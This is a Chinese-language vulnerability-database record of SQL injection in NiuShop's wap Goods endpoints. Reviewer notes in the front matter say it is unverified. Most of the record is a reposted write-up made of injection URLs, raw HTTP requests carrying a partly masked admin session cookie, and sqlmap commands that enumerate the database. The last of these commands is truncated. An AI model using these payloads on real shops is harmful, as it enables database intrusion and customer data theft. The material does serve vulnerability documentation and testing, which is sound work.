---
source: "hatch 补库批 20260928"
product: "NiuShop version unspecified"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Niushop sql注入"
prerequisites: "来源所述条件，未列明部分仍待核：wap Goods接口；请求带管理员Cookie，实际鉴权未排除"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-73bdbe797be95b394f3213d4"
entity_id: "ve-73bdbe797be95b394f3213d4"
schema_version: "1"
---

## 核对与使用边界

- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：wap Goods接口；请求带管理员Cookie，实际鉴权未排除

- **事实待核（1）**：完全无版本/源码/响应，仅单引号或sqlmap星号标记不能作为验证。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **结论使用边界（2）**：三个入口及order/attr_array/group_id分开建实体，不能混为单漏洞。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **凭据与会话边界（3）**：尾命令--dbms mysql引号未闭合，明显截断；Host与Referer/会话残留。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Niushop sql注入

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### sql注入（一）

#### order参数：

    http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&brand_id=2&min_price=3&max_price=4&page=5&page_size=6&order=7%27&attr_array[][2]=8&spec_array[]=9

#### attr\_array参数：

    http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&brand_id=2&min_price=3&max_price=4&page=5&page_size=6&order=7&attr_array[][2]=8%27&spec_array[]=9

#### 直接上sqlmap

    sqlmap -u "http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&brand_id=2&min_price=3&max_price=4&page=5&page_size=6&order=7&attr_array[][2]=8*&spec_array[]=9" --random-agent --batch --dbms "mysql"
    sqlmap -u "http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&brand_id=2&min_price=3&max_price=4&page=5&page_size=6&order=7&attr_array[][2]=8*&spec_array[]=9" --random-agent --batch --dbms "mysql" --current-db

### sql注入（二）

    GET /index.php?s=/wap/Goods/promotionZone&group_id=*&page=1 HTTP/1.1
    Host: 0-sec.org
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://172.16.209.129:8085/index.php/wap/goods/promotionZone
    X-Requested-With: XMLHttpRequest
    Cookie: PHPSESSID=uol********************bk4; admin_type=1; workspaceParamSupplier=index%7CGoods; CNZZDATA009=30037667-1536735
    Connection: close

将数据包保存为niushop.txt

    sqlmap -r niushop.txt  --random-agent --batch --dbms "mysql"

### sql注入（三）

    POST /index.php?s=/wap/Goods/goodsSearchList HTTP/1.1
    Host: 0-sec.org
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://172.16.209.129:8086/index.php/wap/goods/goodsSearchList
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 66
    Cookie: PHPSESSID=uol********************bk4; admin_type=1; workspaceParamSupplier=index%7CGoods; CNZZDATA009=30037667-1536735
    Connection: close
    Cache-Control: max-age=0

    sear_name=&sear_type=1&order=*&sort=asc&controlType=&shop_id=0&page=1

数据包保存为niushop.txt

    sqlmap -r niushop.txt  --random-agent --batch --dbms "mysql
